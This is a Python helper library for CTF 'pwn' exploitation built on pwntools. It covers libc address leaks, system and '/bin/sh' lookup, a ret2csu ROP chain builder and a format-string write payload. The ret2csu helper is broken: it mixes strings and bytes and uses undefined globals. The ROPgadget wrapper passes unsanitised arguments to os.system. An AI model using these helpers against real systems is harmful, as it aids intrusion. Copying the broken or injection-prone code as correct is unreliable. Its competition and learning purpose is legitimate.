"""
This module provides functionality for ctf pwn.
Including some common operations in learning and competitions

Welcome all masters to provide advice on the code
Please visit https://lmarch2.top/posts/8c945bd4/ for code details

--------------------------------------
Excalibur -- Sword of Contract Victory
--------------------------------------

Example:
    >>> from Excalibur2 import*
"""


# Module code goes here


#-----------------------------------------------------------------------------------------
# Packages
#-----------------------------------------------------------------------------------------


from pwn import *
import os
from struct import pack
from ctypes import *
import base64
import click
from LibcSearcher import *


#-----------------------------------------------------------------------------------------
# Settings
#-----------------------------------------------------------------------------------------


# Set up debugging terminal (especially efficient on WSL2)
# 如何在WSL2上使用tmux调试请看https://lmarch2.top/posts/19b7c9d1/
def setterminal(termin='tmux',*args):
	'''
	------
	Descriptions
	set debug terminal
	设置调试终端

	------
	Parameters
	termin : debug terminal (default tmux)
	args (optional) : context.terminal = [termin,args]

	------
	Returns
	None
	'''
	if(len(args)<=0):
		context.terminal = [termin, 'splitw', '-h']
	else:
		context.terminal = [termin,args]

def contextset(ar = 64, de = 1):
	'''
	------
	Descriptions
	set your structure and debug mode
	设置文件架构和调试模式

	------
	Parameters
	ar : choose arch for amd64 (64) or i386 (32)
	de : using debug mode (1) or not (0)

	------
	Returns
	None
	'''
	if ar == 32:	
		if de == 0:
			context(os='linux', arch='i386')
		else:
			context(log_level='debug', os='linux', arch='i386')
	else:
		if de == 0:
			context(os='linux', arch='amd64')
		else:
			context(os='linux', arch='amd64', log_level='debug')

#-----------------------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------------------


def debug(c = 0):
	'''
	------
	Descriptions
	debug
	To use gdb debugging, please use the command line parameter G, such as: python3 exp.py G
	调试
	若要使用gdb调试，请使用命令行参数G，如：python3 exp.py G

	------
	Parameters
	c : gdb attach上进程之后执行的命令字符串 (0)

	------
	Returns
	None
	'''
	if args.G:
		if(c):
			gdb.attach(p, c)
		else:
			gdb.attach(p)
			#pause()

def prb(data):
	'''
	------
	Descriptions
	print raw bytes without escaping
	不转义打印原始字符串

	------
	Parameters
	data ： the data you want to print

	------
	Returns
	None
	'''
	for byte in data:
		print(f"\\x{byte:02x}", end="")
	print()

def pr(addr) : 
	'''print abbreviation
	打印'''
	print(addr)

def prh(addr) : 
	'''print Hexadecimal data abbreviation
	打印十六进制'''
	print(hex(addr))
	
def prl(addr) : 
	'''print length of data abbreviation
	打印数据长度'''
	print(len(addr))
	
def lib(arg = '/usr/lib/x86_64-linux-gnu/libc.so.6') : 
	'''
	------
	Descriptions
    load libc, default local system libc
	加载libc，默认本地系统libc

	------
	Parameters
	arg ： the path of libc

	------
	Returns
	None
	'''
	global libc
	libc = ELF(arg)
def el(arg='pwn') :
	'''
	------
	Descriptions
    load elf, default filename pwn
	加载elf，默认文件名是pwn

	------
	Parameters
	arg ： the path of elf

	------
	Returns
	None
	'''
	global elf
	elf = ELF(arg)
def proc(bin) :
	'''
	------
	Descriptions
    load binary when no command line parameter R provided
	没有命令行参数R时加载二进制文件

	------
	Parameters
	bin ： the path of binary

	------
	Returns
	p
	'''
	if not args.R:
		global p
		p = process(bin)
		return p

def remo(ip,port='') :
	'''
	------
	Descriptions
	connect to remote when command line parameter R provided
	有命令行参数R时连接到远程

	------
	Parameters
	ip ： ip of remote 
	port: port of remote
	using remo(ip) when given ip = ip:port or ip = ip port
	using remo(ip,port) when given ip and port

	------
	Returns
	p
	'''
	if args.R:
		global p
		if ' ' in ip :
			ip_port = ip.split(' ')
			p = remote(ip_port[0],ip_port[1])
		if not ':' in ip :
			p = remote(ip,port)
		else:
			ip_port = ip.split(':')
			p = remote(ip_port[0],ip_port[1])
		return p
	
def get_addr64() : 
	'''
	------
	Descriptions
    Receive leaked 64-bit libc address
	接收泄露的64位libc地址

	------
	Parameters
	None

	------
	Returns
	recieved addr
	'''
	recvaddr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
	print("\n >>>>  The  addr is ",hex(recvaddr),'\n')
	return recvaddr

def get_addr32() : 
	'''
	------
	Descriptions
    Receive leaked 32-bit libc address
	接收泄露的32位libc地址

	------
	Parameters
	None

	------
	Returns
	recieved addr
	'''
	recvaddr = u32(p.recvuntil(b'\xf7')[-4:])
	print("\n >>>>  The  addr is ",hex(recvaddr),'\n')
	return recvaddr
	
def sym(fun,*pie_base) :
	'''
	------
	Descriptions
    Binary file function address offset
	二进制文件函数地址偏移

	------
	Parameters
	fun : function name
	pie_base (optional) : the binary base when pie enabled

	------
	Returns
	addr of func
	'''
	if(len(pie_base)<=0):
		addr = elf.sym[fun]
		print("\n >>>>  The ",fun," offset is ",hex(addr),'\n')	
		return addr
	else :
		addr = elf.sym[fun]+pie_base
		print("\n >>>>  pie_base ",pie_base,'\n')
		print("\n >>>>  The ",fun," offset is ",hex(elf.sym[fun])," (without base)",'\n')		
		print("\n >>>>  The ",fun," offset is ",hex(addr)," (with base)",'\n')
		return addr
		
def got(fun,*pie_base) :
	'''
	------
	Descriptions
    Binary file function got address offset
	二进制文件函数got表地址偏移

	------
	Parameters
	fun : function name
	pie_base (optional) : the binary base when pie enabled

	------
	Returns
	got addr of func
	'''
	if(len(pie_base)<=0):
		addr = elf.got[fun]
		print("\n >>>>  The ",fun," got is ",hex(addr),'\n')
		return addr
	else :
		addr = elf.got[fun]+pie_base
		print("\n >>>>  pie_base ",pie_base,'\n')
		print("\n >>>>  The ",fun," offset is ",hex(elf.got[fun])," (without base)",'\n')		
		print("\n >>>>  The ",fun," got is ",hex(addr)," (with base)",'\n')
		return addr
			
def plt(fun,*pie_base) :
	'''
	------
	Descriptions
    Binary file function plt address offset
	二进制文件函数plt表地址偏移

	------
	Parameters
	fun : function name
	pie_base (optional) : the binary base when pie enabled

	------
	Returns
	plt addr of func
	'''
	if(len(pie_base)<=0):	
		addr = elf.plt[fun]
		print("\n >>>>  The ",fun," plt is ",hex(addr),'\n')
		return addr
	else :
		addr = elf.plt[fun]+pie_base
		print("\n >>>>  pie_base ",pie_base,'\n')
		print("\n >>>>  The ",fun," offset is ",hex(elf.plt[fun])," (without base)",'\n')		
		print("\n >>>>  The ",fun," plt is ",hex(addr)," (with base)",'\n')
		return addr
	
def libcsym(fun,off=0):
	'''
	------
	Descriptions
    libc function address offset
	libc文件函数地址偏移
	用于计算一两个libc函数地址时比较方便

	------
	Parameters
	fun : function name
	off (optional) : the libc base when pie enabled

	------
	Returns
	addr of libc func
	'''
	if(off==0):
		addr = libc.sym[fun]
		print("\n >>>>  The ",fun," offset is ",hex(addr),'\n')
		return addr
	else:
		addr = libc.sym[fun]+off
		print("\n >>>>  The ",fun," offset is ",hex(libc.sym[fun]),' (without base)\n')
		print("\n >>>>  The ",fun," offset is ",hex(addr),' (with base)\n')
		return addr
	
def setbase(add):
	'''
	------
	Descriptions
    Add the base address and offset to get the real address
	给二进制文件设置基址

	------
	Parameters
	add : the base addr of binary

	------
	Returns
	None
	'''
	global elfbase
	elfbase = add
	print(">>>>  your binary base is ",hex(elfbase))

def setlibcbase(add):
	'''
	------
	Descriptions
    Add the base address and offset to get the real address
	给libc设置基址

	------
	Parameters
	add : the base addr of binary

	------
	Returns
	None
	'''
	global libcbase
	libcbase = add
	print(">>>>  your libc base is ",hex(libcbase))
	
def elsym(add):
	'''
	------
	Descriptions
    set elfbase for binary
	基址和偏移相加得到真实地址

	------
	Parameters
	add : the addr needed to be added

	------
	Returns
	elfbase + add
	'''
	elfbase = globals()['elfbase']
	print(">>>>  The elf add with base is ",hex(elfbase+add))
	return elfbase+add

def lisym(add):
	'''
	------
	Descriptions
    set elfbase for binary
	基址和偏移相加得到真实地址

	------
	Parameters
	add : the addr needed to be added

	------
	Returns
	libcbase + add
	'''
	libcbase = globals()['libcbase']
	print(">>>>  The libc add with base is ",hex(libcbase+add))
	return libcbase+add

def searchlibc(fun,real_addr,agu=0,offset=0) :
	'''
	------
	Descriptions
    Determine the libc version from the leaked function real address and return /bin/sh string address and system function address
	由泄露的函数真实地址确定libc版本,并返回/bin/sh字符串地址和system函数地址

	------
	Parameters
	fun : function name
	real_addr =: leaked real addr of func
	agu : flag of using libc (1) or libcsearcher (0) 
	offset : the offset between leaked addr and base addr of func

	------
	Returns
	binsh, system
	'''
	libc = globals()['libc']
	if agu :
		base_addr = real_addr - libc.symbols[fun] - offset
		setlibcbase(base_addr)
		system = libc.symbols['system'] + base_addr
		binsh = libc.search(b'/bin/sh').__next__() + base_addr
		print("\n >>>>  The base addr is ",hex(base_addr),'\n')
		print("\n >>>>  The bin_addr ",hex(binsh),'\n')		
		print("\n >>>>  The system addr is ",hex(system),'\n')
		return binsh, system
	else :
		libc=LibcSearcher(fun,real_addr-offset)
		offset=real_addr-libc.dump(fun)
		setlibcbase(offset)
		binsh=offset+libc.dump('str_bin_sh')
		system=offset+libc.dump('system')
		print("\n >>>>  The offset is ",hex(offset),'\n')
		print("\n >>>>  The bin_addr ",hex(binsh),'\n')		
		print("\n >>>>  The system addr is ",hex(system),'\n')
		return binsh, system

def csu(rbx, rbp, r12, r13, r14, r15,csu_end_addr,csu_front_addr, last):
	'''
	------
	Descriptions
    ret2csu utilizes rop chain
	ret2csu利用rop链
	# pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13

	------
	Parameters
	rbx, rbp, r12, r13, r14, r15 : registers
	csu_end_addr,csu_front_addr, last : gadgets

	------
	Returns
	binsh, system
	'''
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
	payload = 'a' * 0x80 + fakeebp
	payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
	payload += p64(csu_front_addr)
	payload += 'a' * 0x38
	payload += p64(last)
	sh.send(payload)
	sleep(1)

"""
mov     rdx, r14
mov     rsi, r13
mov     edi, r12d
call    ds:(__frame_dummy_init_array_entry - 403E00h)[r15+rbx*8]
add     rbx, 1
cmp     rbp, rbx
jnz     short loc_401330

loc_401346:
add     rsp, 8
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn

"""

def fmt(offset,begin,end,size,written):
	'''
	------
	Descriptions
	fmt attack
    fmt攻击

	------
	Parameters
	offset : fmt 偏移
	begin : 背写的地址
	end : 写入的地址
	size : 写入的格式化字符串形式
	wriiten : printf函数已写入的字节数

	------
	Returns

	elfbase + add
    # offset（int） - 您控制的第一个格式化程序的偏移量
    # 字典（dict） - 被写入地址对应->写入的数据，可多个对应{addr: value, addr2: value2}
    # numbwritten（int） - printf函数已写入的字节数
    # write_size（str） - 必须是byte，short或int。告诉您是否要逐字节写入，短按short或int（hhn，hn或n）
	'''
	payload = fmtstr_payload(offset,{begin: end},write_size = size,numbwritten=written)
	return payload

def ROPgadget(bin, order, gr = '' ,*option):
	'''
	------
	Descriptions
	find gadgets you want using ROPgadget
    使用ROPgadget找到想要的gadget

	------
	Parameters
	bin : binary file
	order : gadget you want
	gr : using grep (1) or not (0)
	option : to find a string

	------
	Returns
	elfbase + add
	'''
	if option == 'string':
		cmd = f'ROPgadget --binary {bin} --string "{order}"'
	else:
		if gr == 0:
			cmd = f'ROPgadget --binary {bin} --only "pop|ret"' 
		else:
			cmd = f'ROPgadget --binary {bin} --only "pop|ret" | grep gr'
	os.system(cmd)
	result = os.popen(cmd).read()
	addresses = result.split('\n')
	custom_address = None
	for address in addresses:
		if order in address:
			if order.strip() == address.split(':')[1].strip():
				custom_address = address.split(':')[0].strip()
				break
	if custom_address:
		print(f">>> '{order}' address:", custom_address)
	else:
		print(f">>> '{order}' address not found.")
	
	return int(custom_address,16)


#-----------------------------------------------------------------------------------------
# Alias
#-----------------------------------------------------------------------------------------


# sendafter(delim,data)
sda = lambda delim,data :p.sendafter(delim,data)
# send(data)
sd = lambda data :p.send(data)
# sendline(data)
sl = lambda data :p.sendline(data)
# sendlineafter(delim,data)
sla = lambda delim,data :p.sendlineafter(delim,data)
# recv()
rc = lambda :p.recv()
# recv(data)
rec = lambda data :p.recv(data)
# recvuntil(delims,drop)
ru = lambda delims,drop=True :p.recvuntil(delims,drop)
# int(data,16)
int16   = lambda data :int(data,16)
# u32(data.ljust(4,b'\x00'))
uu32 = lambda data :u32(data.ljust(4,b'\x00'))
# u64(data.ljust(8,b'\x00'))
uu64 = lambda data :u64(data.ljust(8,b'\x00'))
# log.success(name+'='+hex(addr))
lg = lambda name,addr :log.success(name+'='+hex(addr))
# interactive()
ia = lambda :p.interactive()
# close()
cl = lambda :p.close()

